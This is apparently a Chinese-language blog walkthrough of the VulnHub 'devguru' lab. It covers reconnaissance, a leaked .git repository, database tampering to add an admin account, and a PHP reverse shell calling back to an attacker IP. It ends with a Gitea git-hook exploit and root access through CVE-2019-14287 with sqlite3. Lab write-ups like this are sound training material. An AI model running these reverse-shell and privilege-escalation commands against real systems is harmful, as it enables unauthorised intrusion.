---
title: 靶场实战：devguru
tags: linux提权,web渗透,vulnhub靶场
category: 靶场实战
renderNumberedHeading: true
slug:  storywriter/tutorial
emoji: 🎇
color: 'var(--base0A)'
cover: '![](./img/use_cover.jpg)'
theme: xsj-fall
---



靶场实战：devguru

靶机地址[devguru](https://www.vulnhub.com/entry/devguru-1,620/)

#### 信息收集

常规扫描

`sudo nmap 192.168.1.0/24 -sn`靶机发现192.168.1.138

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278830305.png)

`sudo nmap $ip -p- --min-rate=10000`端口扫描22,80,8585

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278873458.png)

`sudo nmap $ip -p$ports -sT -sC -sV -O -oA devguru/detail`细节扫描，tcp协议扫描对应端口，-sC使用默认脚本，-SV扫描版本信息，-O确定操作系统，-oA格式化输出

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278893053.png)

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278903236.png)

80端口存在git泄露，8585端口运行了gitea

`sudo nmap -sU --top-ports 20 $ip -oA devguru/udp`扫描udp的常见端口，有时可以多指定一些端口

![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278926588.png)

目录扫描，有时一个工具没有收获可以多试试几个工具（如dirb，dirsearch，gobuster等）

80端口目录

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278960600.png)

8585端口的目录

![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746278981133.png)

#### 开始渗透

80端口存在git泄露，使用githack工具下载下来

`sudo python GitHack.py http://192.168.1.138`

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279056940.png)

重点查看配置相关文件

config下的database.php发现数据库信息

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279073567.png)

访问80端口的adminer.php发现是数据库管理

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279098699.png)

使用刚刚获取的信息登录

优先关注users等信息，只找到一个backend_users的表，此时有两个思路，1修改原来管理员的密码，危险程度较高，容易被发现，2是新建一个用户，危险程度较低，这里选择新建用户
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279119471.png)

最后is_superuser要设置为1，在用户组将我们新建的用户归类到管理员组

同时根据数据库加上80端口扫描的目录backend,访问并登录

登录之后在cms -add - code输入反弹shell的指令

```
function onStart(){
//nc监听7777端口
    $s   =fsockopen("192.168.1.114",5555);
    $proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);
}
```

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279130337.png)

同时开启本地监听`nc -lvvp 5555`

访问/home1（新建网页名称）执行代码获取shell

成功拿到shell
![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279147662.png)

#### 权限提升

##### 获取高交互shell

使用`python3 -c 'import pty;pty.spawn("/bin/bash")'`获得交互更好的shell（使用什么版本的python主要看环境有什么版本）

读取/etc/passwd文件发现只有root和frank用户有/bin/bash即允许ssh且有高交互shell

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279163760.png)

尝试读取shadow文件权限不允许，通常shadow文件都是只有root用户有权限的，但是也不一定，如果可以读取就可以利用该文件进行hash碰撞

使用python启动一个快速http服务共享文件`python -m http.server`

使用wget下载linpeas.sh和LinEnum.sh

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279178588.png)

提升权限并运行脚本

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279195376.png)

suid不存在提权，看看sudo，需要密码，无法获得

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279207508.png)

查看备份文件
![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279217041.png)

##### 获取普通用户

发现新的服务器连接
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279262092.png)


同样查看user，因为我们已经获取了web的权限，因此这里我们想要获取frank用户的权限，所以这里的选择是更改frank的密码
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279271344.png)

原来的gitea的加密方式是pbkdf2且有salt，我们选择换一个加密方式，bcrypt，使用网站实现（我这里尝试了几种方式，只有bcrypt可行，有的博客使用了原加密方式，但没说清楚salt值的获取）[在线Bcrypt密码生成工具-Bejson.com](https://www.bejson.com/encrypt/bcrpyt_encode/#google_vignette)

`$2a$10$sV1DF9po/5T1BE2dsy2OueGZ/VuPrUrwDR6aA88Ygu2gv6GPeGtzO`

结合目录扫描的结构gitea在8585端口
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279287060.png)

左下角显示gitea的版本是1.12.5

该版本存在以下漏洞

setting -> git hook输入命令

然后编辑 readme.md 随便编辑即可执行
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279380648.png)

成功拿到
![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279429126.png)

存在sqlite3无需密码使用
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279453993.png)
#### sqlite3配合sudo漏洞提权

发现特权命令/usr/bin/sqlite3使用网站查找[GTFOBins](https://gtfobins.github.io/)

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279463974.png)

复制，执行，发现

![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279479812.png)
![](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279489723.png)

sudo的版本是1.8.21，存在一个[CVE-2019-14287：sudo权限绕过漏洞分析与复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/217089.html)的漏洞

这里可以使用该漏洞配合sqlite3提权

`sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'`
![enter description here](https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746279496031.png)